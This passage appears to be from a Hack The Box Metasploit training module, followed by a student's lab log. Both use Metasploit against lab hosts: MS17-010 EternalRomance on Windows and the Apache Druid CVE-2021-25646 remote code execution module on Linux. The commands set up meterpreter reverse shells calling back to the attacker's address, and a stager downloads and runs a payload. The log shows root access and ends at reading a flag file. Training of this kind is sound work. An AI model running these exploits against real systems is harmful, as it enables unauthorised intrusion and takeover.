   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Finally, since we are about to use a TCP-based reverse shell (`/windows/meterpreter/reverse_tcp`) we need to specify to which IP address it needs to connect to in order to establish a connection. Therefore, we need to set `LHOST` to our own IP address like following:

#### MSF - LHOST Specification

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15

LHOSTS => 10.10.14.15


msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Once everything is set and ready to go, we can proceed to launch the attack. Note that the payload was not set here, as the default one is sufficient for this demonstration.

#### MSF - Exploit Execution

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-13 21:37:21 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


meterpreter> shell

C:\Windows\system32>
```

We now have a shell on the target machine, and we can interact with it.

#### MSF - Target Interaction

```shell-session
C:\Windows\system32> whoami

whoami
nt authority\system
```

This has been a quick and dirty example of how `msfconsole` can help out quickly but serves as an excellent example of how the framework works. Only one module was needed without any `payload` selection, `encoding` or `pivoting` between sessions or jobs.

---

## Questions

Answer the question(s) below to complete the section

Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer.

```
┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-gdqkq5ypmw]─[~]
└──╼ [★]$ msfconsole -q
[msf](Jobs:0 Agents:0) >> search eternalromance

Matching Modules
================

   #   Name                                  Disclosure Date  Rank    Check  Description
   -   ----                                  ---------------  ----    -----  -----------
   0   exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1     \_ target: Automatic                .                .       .      .
   2     \_ target: PowerShell               .                .       .      .
   3     \_ target: Native upload            .                .       .      .
   4     \_ target: MOF upload               .                .       .      .
   5     \_ AKA: ETERNALSYNERGY              .                .       .      .
   6     \_ AKA: ETERNALROMANCE              .                .       .      .
   7     \_ AKA: ETERNALCHAMPION             .                .       .      .
   8     \_ AKA: ETERNALBLUE                 .                .       .      .
   9   auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   10    \_ AKA: ETERNALSYNERGY              .                .       .      .
   11    \_ AKA: ETERNALROMANCE              .                .       .      .
   12    \_ AKA: ETERNALCHAMPION             .                .       .      .
   13    \_ AKA: ETERNALBLUE                 .                .       .      .


Interact with a module by name or index. For example info 13, use 13 or use auxiliary/admin/smb/ms17_010_command

[msf](Jobs:0 Agents:0) >> use 6
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> info

       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     Module: exploit/windows/smb/ms17_010_psexec
   Platform: Windows
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2017-03-14

Provided by:
  sleepya
  zerosum0x0
  Shadow Brokers
  Equation Group[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> search druid

Matching Modules
================

   #   Name                                            Disclosure Date  Rank       Check  Description
   -   ----                                            ---------------  ----       -----  -----------
   0   exploit/linux/http/apache_druid_js_rce          2021-01-21       excellent  Yes    Apache Druid 0.20.0 Remote Command Execution
   1     \_ target: Linux (dropper)                    .                .          .      .
   2     \_ target: Unix (in-memory)                   .                .          .      .
   3   exploit/multi/http/apache_druid_cve_2023_25194  2023-02-07       excellent  Yes    Apache Druid JNDI Injection RCE
   4     \_ target: Automatic                          .                .          .      .
   5     \_ target: Windows                            .                .          .      .
   6     \_ target: Linux                              .                .          .      .
   7   auxiliary/spoof/dns/bailiwicked_domain          2008-07-21       normal     Yes    DNS BailiWicked Domain Attack
   8   auxiliary/spoof/dns/bailiwicked_host            2008-07-21       normal     Yes    DNS BailiWicked Host Attack
   9   auxiliary/scanner/http/log4shell_scanner        2021-12-09       normal     No     Log4Shell HTTP Scanner
   10    \_ AKA: Log4Shell                             .                .          .      .
   11    \_ AKA: LogJam                                .                .          .      .
   12  exploit/solaris/sunrpc/ypupdated_exec           1994-12-12       excellent  No     Solaris ypupdated Command Execution
   13  exploit/solaris/dialup/manyargs                 2001-12-12       good       No     System V Derived /bin/login Extraneous Arguments Buffer Overflow
   14  auxiliary/scanner/telephony/wardial             .                normal     No     Wardialer


Interact with a module by name or index. For example info 14, use 14 or use auxiliary/scanner/telephony/wardial

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> use 0
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> info

       Name: Apache Druid 0.20.0 Remote Command Execution
     Module: exploit/linux/http/apache_druid_js_rce
   Platform: Linux, Unix
       Arch: x86, x64, cmd
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2021-01-21

Provided by:
  Litch1, Security Team of Alibaba Cloud
  je5442804

Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   Linux (dropper)
      1   Unix (in-memory)

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:p
                                        ort][...]. Supported proxies: sapni, socks4, http,
                                        socks5, socks5h
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com
                                        /docs/using-metasploit/basics/using-metasploit.html
  RPORT      8888             yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is random
                                        ly generated)
  TARGETURI  /                yes       The base path of Apache Druid
  URIPATH                     no        The URI to use for this exploit (default is random)
  VHOST                       no        HTTP server virtual host


  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. Thi
                                      s must be an address on the local machine or 0.0.0.0
                                      to listen on all addresses.
  SRVPORT  8080             yes       The local port to listen on.

Payload information:

Description:
  Apache Druid includes the ability to execute user-provided JavaScript code embedded in
  various types of requests; however, that feature is disabled by default.

  In Druid versions prior to `0.20.1`, an authenticated user can send a specially-crafted request
  that both enables the JavaScript code-execution feature and executes the supplied code all
  at once, allowing for code execution on the server with the privileges of the Druid Server process.
  More critically, authentication is not enabled in Apache Druid by default.

  Tested on the following Apache Druid versions:

  * 0.15.1
  * 0.16.0-iap8
  * 0.17.1
  * 0.18.0-iap3
  * 0.19.0-iap7
  * 0.20.0-iap4.1
  * 0.20.0
  * 0.21.0-iap3

References:
  https://nvd.nist.gov/vuln/detail/CVE-2021-25646
  https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E
  https://github.com/yaunsky/cve-2021-25646/blob/main/cve-2021-25646.py


View the full module info with the info -d command.

[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> info

       Name: Apache Druid 0.20.0 Remote Command Execution
     Module: exploit/linux/http/apache_druid_js_rce
   Platform: Linux, Unix
       Arch: x86, x64, cmd
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2021-01-21

Provided by:
  Litch1, Security Team of Alibaba Cloud
  je5442804

Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   Linux (dropper)
      1   Unix (in-memory)

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:p
                                        ort][...]. Supported proxies: sapni, socks4, http,
                                        socks5, socks5h
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com
                                        /docs/using-metasploit/basics/using-metasploit.html
  RPORT      8888             yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is random
                                        ly generated)
  TARGETURI  /                yes       The base path of Apache Druid
  URIPATH                     no        The URI to use for this exploit (default is random)
  VHOST                       no        HTTP server virtual host


  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. Thi
                                      s must be an address on the local machine or 0.0.0.0
                                      to listen on all addresses.
  SRVPORT  8080             yes       The local port to listen on.

Payload information:

Description:
  Apache Druid includes the ability to execute user-provided JavaScript code embedded in
  various types of requests; however, that feature is disabled by default.

  In Druid versions prior to `0.20.1`, an authenticated user can send a specially-crafted request
  that both enables the JavaScript code-execution feature and executes the supplied code all
  at once, allowing for code execution on the server with the privileges of the Druid Server process.
  More critically, authentication is not enabled in Apache Druid by default.

  Tested on the following Apache Druid versions:

  * 0.15.1
  * 0.16.0-iap8
  * 0.17.1
  * 0.18.0-iap3
  * 0.19.0-iap7
  * 0.20.0-iap4.1
  * 0.20.0
  * 0.21.0-iap3

References:
  https://nvd.nist.gov/vuln/detail/CVE-2021-25646
  https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E
  https://github.com/yaunsky/cve-2021-25646/blob/main/cve-2021-25646.py


View the full module info with the info -d command.

[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set LHOST 10.10.14.4
LHOST => 10.10.14.4
[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set RHOSTS 10.129.203.52
RHOSTS => 10.129.203.52
[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> run
[-] Exploit failed: windows/meterpreter/reverse_tcp is not a compatible payload.
[*] Exploit completed, but no session was created.
[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> info

       Name: Apache Druid 0.20.0 Remote Command Execution
     Module: exploit/linux/http/apache_druid_js_rce
   Platform: Linux, Unix
       Arch: x86, x64, cmd
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2021-01-21

Provided by:
  Litch1, Security Team of Alibaba Cloud
  je5442804

Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   Linux (dropper)
      1   Unix (in-memory)

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:p
                                        ort][...]. Supported proxies: sapni, socks4, http,
                                        socks5, socks5h
  RHOSTS     10.129.203.52    yes       The target host(s), see https://docs.metasploit.com
                                        /docs/using-metasploit/basics/using-metasploit.html
  RPORT      8888             yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is random
                                        ly generated)
  TARGETURI  /                yes       The base path of Apache Druid
  URIPATH                     no        The URI to use for this exploit (default is random)
  VHOST                       no        HTTP server virtual host


  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. Thi
                                      s must be an address on the local machine or 0.0.0.0
                                      to listen on all addresses.
  SRVPORT  8080             yes       The local port to listen on.

Payload information:

Description:
  Apache Druid includes the ability to execute user-provided JavaScript code embedded in
  various types of requests; however, that feature is disabled by default.

  In Druid versions prior to `0.20.1`, an authenticated user can send a specially-crafted request
  that both enables the JavaScript code-execution feature and executes the supplied code all
  at once, allowing for code execution on the server with the privileges of the Druid Server process.
  More critically, authentication is not enabled in Apache Druid by default.

  Tested on the following Apache Druid versions:

  * 0.15.1
  * 0.16.0-iap8
  * 0.17.1
  * 0.18.0-iap3
  * 0.19.0-iap7
  * 0.20.0-iap4.1
  * 0.20.0
  * 0.21.0-iap3

References:
  https://nvd.nist.gov/vuln/detail/CVE-2021-25646
  https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E
  https://github.com/yaunsky/cve-2021-25646/blob/main/cve-2021-25646.py


View the full module info with the info -d command.

[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set payload payload/linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> run
[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Using URL: http://10.10.14.4:8080/3mSWWqB
[*] Client 10.129.203.52 (curl/7.68.0) requested /3mSWWqB
[*] Sending payload to 10.129.203.52 (curl/7.68.0)
[*] Sending stage (3090404 bytes) to 10.129.203.52
[*] Meterpreter session 2 opened (10.10.14.4:4444 -> 10.129.203.52:52644) at 2026-05-27 14:37:24 -0400
[*] Command Stager progress - 100.00% done (110/110 bytes)
[*] Server stopped.

(Meterpreter 2)(/root/druid) > ps | head
Filtering on 'head'
No matching processes were found.
(Meterpreter 2)(/root/druid) > ps | more
Filtering on 'more'
No matching processes were found.
(Meterpreter 2)(/root/druid) > ps

Process List
============

 PID   PPID  Name                Arch    User              Path
 ---   ----  ----                ----    ----              ----
 1     0     systemd             x86_64  root              /usr/lib/systemd/systemd
 3     2     [rcu_gp]            x86_64  root
 4     2     [rcu_par_gp]        x86_64  root
 6     2     [kworker/0:0H-kblo  x86_64  root
             ckd]
 9     2     [mm_percpu_wq]      x86_64  root
 10    2     [ksoftirqd/0]       x86_64  root
 11    2     [rcu_sched]         x86_64  root
 12    2     [migration/0]       x86_64  root
 13    2     [idle_inject/0]     x86_64  root
 14    2     [cpuhp/0]           x86_64  root
 15    2     [cpuhp/1]           x86_64  root
 16    2     [idle_inject/1]     x86_64  root
 17    2     [migration/1]       x86_64  root
 18    2     [ksoftirqd/1]       x86_64  root
 20    2     [kworker/1:0H-kblo  x86_64  root
             ckd]
 21    2     [kdevtmpfs]         x86_64  root
 22    2     [netns]             x86_64  root
 23    2     [rcu_tasks_kthre]   x86_64  root
 24    2     [kauditd]           x86_64  root
 25    2     [khungtaskd]        x86_64  root
 26    2     [oom_reaper]        x86_64  root
 27    2     [writeback]         x86_64  root
 28    2     [kcompactd0]        x86_64  root
 29    2     [ksmd]              x86_64  root
 30    2     [khugepaged]        x86_64  root
 35    2     [kworker/1:1-event  x86_64  root
             s]
 77    2     [kintegrityd]       x86_64  root
 78    2     [kblockd]           x86_64  root
 79    2     [blkcg_punt_bio]    x86_64  root
 80    2     [tpm_dev_wq]        x86_64  root
 81    2     [ata_sff]           x86_64  root
 82    2     [md]                x86_64  root
 83    2     [edac-poller]       x86_64  root
 84    2     [devfreq_wq]        x86_64  root
 85    2     [watchdogd]         x86_64  root
 88    2     [kswapd0]           x86_64  root
 89    2     [ecryptfs-kthrea]   x86_64  root
 91    2     [kthrotld]          x86_64  root
 92    2     [irq/24-pciehp]     x86_64  root
 93    2     [irq/25-pciehp]     x86_64  root
 94    2     [irq/26-pciehp]     x86_64  root
 95    2     [irq/27-pciehp]     x86_64  root
 96    2     [irq/28-pciehp]     x86_64  root
 97    2     [irq/29-pciehp]     x86_64  root
 98    2     [irq/30-pciehp]     x86_64  root
 99    2     [irq/31-pciehp]     x86_64  root
 100   2     [irq/32-pciehp]     x86_64  root
 101   2     [irq/33-pciehp]     x86_64  root
 102   2     [irq/34-pciehp]     x86_64  root
 103   2     [irq/35-pciehp]     x86_64  root
 104   2     [irq/36-pciehp]     x86_64  root
 105   2     [irq/37-pciehp]     x86_64  root
 106   2     [irq/38-pciehp]     x86_64  root
 107   2     [irq/39-pciehp]     x86_64  root
 108   2     [irq/40-pciehp]     x86_64  root
 109   2     [irq/41-pciehp]     x86_64  root
 110   2     [irq/42-pciehp]     x86_64  root
 111   2     [irq/43-pciehp]     x86_64  root
 112   2     [irq/44-pciehp]     x86_64  root
 113   2     [irq/45-pciehp]     x86_64  root
 114   2     [irq/46-pciehp]     x86_64  root
 115   2     [irq/47-pciehp]     x86_64  root
 116   2     [irq/48-pciehp]     x86_64  root
 117   2     [irq/49-pciehp]     x86_64  root
 118   2     [irq/50-pciehp]     x86_64  root
 119   2     [irq/51-pciehp]     x86_64  root
 120   2     [irq/52-pciehp]     x86_64  root
 121   2     [irq/53-pciehp]     x86_64  root
 122   2     [irq/54-pciehp]     x86_64  root
 123   2     [irq/55-pciehp]     x86_64  root
 124   2     [acpi_thermal_pm]   x86_64  root
 125   2     [scsi_eh_0]         x86_64  root
 126   2     [scsi_tmf_0]        x86_64  root
 127   2     [scsi_eh_1]         x86_64  root
 128   2     [scsi_tmf_1]        x86_64  root
 130   2     [vfio-irqfd-clea]   x86_64  root
 131   2     [ipv6_addrconf]     x86_64  root
 141   2     [kstrp]             x86_64  root
 144   2     [kworker/u5:0]      x86_64  root
 157   2     [charger_manager]   x86_64  root
 202   2     [cryptd]            x86_64  root
 213   2     [irq/16-vmwgfx]     x86_64  root
 217   2     [ttm_swap]          x86_64  root
 218   2     [mpt_poll_0]        x86_64  root
 223   2     [mpt/0]             x86_64  root
 226   2     [scsi_eh_2]         x86_64  root
 238   2     [scsi_tmf_2]        x86_64  root
 239   2     [scsi_eh_3]         x86_64  root
 240   2     [scsi_tmf_3]        x86_64  root
 242   2     [scsi_eh_4]         x86_64  root
 244   2     [scsi_tmf_4]        x86_64  root
 246   2     [scsi_eh_5]         x86_64  root
 247   2     [scsi_tmf_5]        x86_64  root
 248   2     [scsi_eh_6]         x86_64  root
 249   2     [scsi_tmf_6]        x86_64  root
 250   2     [scsi_eh_7]         x86_64  root
 251   2     [scsi_tmf_7]        x86_64  root
 252   2     [scsi_eh_8]         x86_64  root
 253   2     [scsi_tmf_8]        x86_64  root
 254   2     [scsi_eh_9]         x86_64  root
 255   2     [scsi_tmf_9]        x86_64  root
 256   2     [scsi_eh_10]        x86_64  root
 257   2     [scsi_tmf_10]       x86_64  root
 258   2     [scsi_eh_11]        x86_64  root
 259   2     [scsi_tmf_11]       x86_64  root
 260   2     [scsi_eh_12]        x86_64  root
 261   2     [scsi_tmf_12]       x86_64  root
 262   2     [scsi_eh_13]        x86_64  root
 263   2     [scsi_tmf_13]       x86_64  root
 265   2     [scsi_eh_14]        x86_64  root
 266   2     [scsi_tmf_14]       x86_64  root
 267   2     [scsi_eh_15]        x86_64  root
 268   2     [scsi_tmf_15]       x86_64  root
 269   2     [scsi_eh_16]        x86_64  root
 270   2     [scsi_tmf_16]       x86_64  root
 271   2     [scsi_eh_17]        x86_64  root
 272   2     [scsi_tmf_17]       x86_64  root
 273   2     [scsi_eh_18]        x86_64  root
 274   2     [scsi_tmf_18]       x86_64  root
 275   2     [scsi_eh_19]        x86_64  root
 276   2     [scsi_tmf_19]       x86_64  root
 277   2     [scsi_eh_20]        x86_64  root
 278   2     [scsi_tmf_20]       x86_64  root
 279   2     [scsi_eh_21]        x86_64  root
 280   2     [scsi_tmf_21]       x86_64  root
 281   2     [scsi_eh_22]        x86_64  root
 282   2     [scsi_tmf_22]       x86_64  root
 283   2     [scsi_eh_23]        x86_64  root
 284   2     [scsi_tmf_23]       x86_64  root
 285   2     [scsi_eh_24]        x86_64  root
 286   2     [scsi_tmf_24]       x86_64  root
 287   2     [scsi_eh_25]        x86_64  root
 288   2     [scsi_tmf_25]       x86_64  root
 289   2     [scsi_eh_26]        x86_64  root
 290   2     [scsi_tmf_26]       x86_64  root
 291   2     [scsi_eh_27]        x86_64  root
 292   2     [scsi_tmf_27]       x86_64  root
 293   2     [scsi_eh_28]        x86_64  root
 294   2     [scsi_tmf_28]       x86_64  root
 295   2     [scsi_eh_29]        x86_64  root
 296   2     [scsi_tmf_29]       x86_64  root
 297   2     [scsi_eh_30]        x86_64  root
 298   2     [scsi_tmf_30]       x86_64  root
 299   2     [scsi_eh_31]        x86_64  root
 300   2     [scsi_tmf_31]       x86_64  root
 325   2     [kworker/u4:28-eve  x86_64  root
             nts_power_efficien
             t]
 329   2     [scsi_eh_32]        x86_64  root
 330   2     [scsi_tmf_32]       x86_64  root
 331   2     [kworker/0:1H-kblo  x86_64  root
             ckd]
 342   2     [kdmflush]          x86_64  root
 369   2     [raid5wq]           x86_64  root
 413   2     [kworker/1:1H-kblo  x86_64  root
             ckd]
 414   2     [jbd2/dm-0-8]       x86_64  root
 415   2     [ext4-rsv-conver]   x86_64  root
 472   1     systemd-journald    x86_64  root              /usr/lib/systemd/systemd-journal
                                                           d
 494   2     [ipmi-msghandler]   x86_64  root
 504   1     systemd-udevd       x86_64  root              /usr/lib/systemd/systemd-udevd
 519   1     systemd-networkd    x86_64  systemd-network   /usr/lib/systemd/systemd-network
                                                           d
 637   2     [kaluad]            x86_64  root
 638   2     [kmpath_rdacd]      x86_64  root
 639   2     [kmpathd]           x86_64  root
 640   2     [kmpath_handlerd]   x86_64  root
 641   1     multipathd          x86_64  root              /usr/sbin/multipathd
 649   2     [jbd2/sda2-8]       x86_64  root
 650   2     [ext4-rsv-conver]   x86_64  root
 663   1     systemd-timesyncd   x86_64  systemd-timesync  /usr/lib/systemd/systemd-timesyn
                                                           cd
 682   1     VGAuthService       x86_64  root              /usr/bin/VGAuthService
 683   1     vmtoolsd            x86_64  root              /usr/bin/vmtoolsd
 703   1     accounts-daemon     x86_64  root              /usr/lib/accountsservice/account
                                                           s-daemon
 704   1     dhclient            x86_64  root              /usr/sbin/dhclient
 707   1     dbus-daemon         x86_64  messagebus        /usr/bin/dbus-daemon
 714   1     irqbalance          x86_64  root              /usr/sbin/irqbalance
 717   1     python3             x86_64  root              /usr/bin/python3.8
 718   1     polkitd             x86_64  root              /usr/lib/policykit-1/polkitd
 719   1     rsyslogd            x86_64  syslog            /usr/sbin/rsyslogd
 722   1     systemd-logind      x86_64  root              /usr/lib/systemd/systemd-logind
 725   1     udisksd             x86_64  root              /usr/lib/udisks2/udisksd
 739   2     [kworker/1:5-event  x86_64  root
             s]
 759   1     ModemManager        x86_64  root              /usr/sbin/ModemManager
 850   1     systemd-resolved    x86_64  systemd-resolve   /usr/lib/systemd/systemd-resolve
                                                           d
 893   1     freshclam           x86_64  clamav            /usr/bin/freshclam
 899   1     cron                x86_64  root              /usr/sbin/cron
 906   1     python3             x86_64  root              /usr/bin/python3.8
 908   1     atd                 x86_64  root              /usr/sbin/atd
 920   1     perl                x86_64  root              /usr/bin/perl
 925   1     sshd                x86_64  root              /usr/sbin/sshd
 933   1     agetty              x86_64  root              /usr/sbin/agetty
 944   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
                                                           4/jre/bin/java
 945   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
                                                           4/jre/bin/java
 946   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
                                                           4/jre/bin/java
 947   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
                                                           4/jre/bin/java
 948   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
                                                           4/jre/bin/java
 949   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
                                                           4/jre/bin/java
 1154  1     snort               x86_64  snort             /usr/sbin/snort
 2104  2     [kworker/u4:0-even  x86_64  root
             ts_power_efficient
             ]
 2105  2     [kworker/0:0-event  x86_64  root
             s]
 2108  2     [kworker/0:1-event  x86_64  root
             s]
 2262  2     [kworker/u4:1-even  x86_64  root
             ts_power_efficient
             ]
 2309  2     [kworker/1:0-event  x86_64  root
             s]
 2396  945   sh                  x86_64  root              /usr/bin/dash
 2399  2396  axjZtKpt            x86_64  root              /tmp/axjZtKpt

(Meterpreter 2)(/root/druid) > migrate 1
[-] The "migrate" command is not supported by this Meterpreter type (x64/linux)
(Meterpreter 2)(/root/druid) > cd ..
(Meterpreter 2)(/root) > ls
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  168   fil   2022-05-16 07:07:41 -0400  .bash_history
100644/rw-r--r--  3137  fil   2022-05-11 09:43:25 -0400  .bashrc
040700/rwx------  4096  dir   2022-05-16 07:04:45 -0400  .cache
040700/rwx------  4096  dir   2022-05-16 06:54:48 -0400  .config
100644/rw-r--r--  161   fil   2019-12-05 09:39:21 -0500  .profile
100644/rw-r--r--  75    fil   2022-05-16 04:45:33 -0400  .selected_editor
040700/rwx------  4096  dir   2021-10-06 13:37:09 -0400  .ssh
100644/rw-r--r--  212   fil   2022-05-11 10:10:43 -0400  .wget-hsts
040755/rwxr-xr-x  4096  dir   2022-05-11 08:51:45 -0400  druid
100755/rwxr-xr-x  95    fil   2022-05-16 06:31:10 -0400  druid.sh
100644/rw-r--r--  22    fil   2022-05-16 06:01:15 -0400  flag.txt
040755/rwxr-xr-x  4096  dir   2021-10-06 13:37:19 -0400  snap

(Meterpreter 2)(/root) > cat flag.txt 
